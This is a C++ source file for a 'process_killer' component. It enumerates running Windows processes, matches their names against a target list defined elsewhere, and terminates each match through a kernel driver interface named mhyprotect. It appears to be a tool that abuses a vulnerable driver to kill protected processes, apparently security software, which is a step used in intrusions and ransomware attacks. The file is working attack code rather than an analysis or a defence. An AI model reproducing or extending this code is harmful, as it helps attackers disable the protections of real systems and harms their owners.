#include "process_killer.h"

//
// convert string to lower case so we can compare incasesensitive
//
wchar_t* process_killer::to_lowercase(const wchar_t* str)
{
    wchar_t* lower_str = _wcsdup(str);

    for (int i = 0; lower_str[i]; i++)
        lower_str[i] = towlower(lower_str[i]);

    return lower_str;
}

//
// compare name against list
//
int process_killer::is_a_target(const wchar_t* name)
{
    wchar_t* tempv = to_lowercase(name);

    for (int i = 0; i < sizeof(process_list) / sizeof(process_list[0]); i++)
    {
        if (wcsstr(tempv, process_list[i]) != NULL)
        {
            free(tempv);
            return 1;
        }
    }

    free(tempv);

    return 0;
}

//
// loop running processes and kill target processes
//
void process_killer::kill_target_processes()
{
    DWORD pOutbuff = 0;
    DWORD bytesRet = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W ProcessEntry;
        ProcessEntry.dwSize = sizeof(ProcessEntry);

        if (Process32FirstW(hSnap, &ProcessEntry))
        {
            do
            {
                wchar_t exeName[MAX_PATH];
                wcscpy_s(exeName, MAX_PATH, ProcessEntry.szExeFile);

                if (process_killer::is_a_target(exeName))
                {
                    if (mhyprotect::driver_impl::terminate_process(ProcessEntry.th32ProcessID)) {
                        wprintf(L"Killed process: %s \n", ProcessEntry.szExeFile);
                    }
                    else {
                        wprintf(L"Failed to kill: %s\n", ProcessEntry.szExeFile);
                    }
                }

            } while (Process32NextW(hSnap, &ProcessEntry));
        }
        CloseHandle(hSnap);
    }
}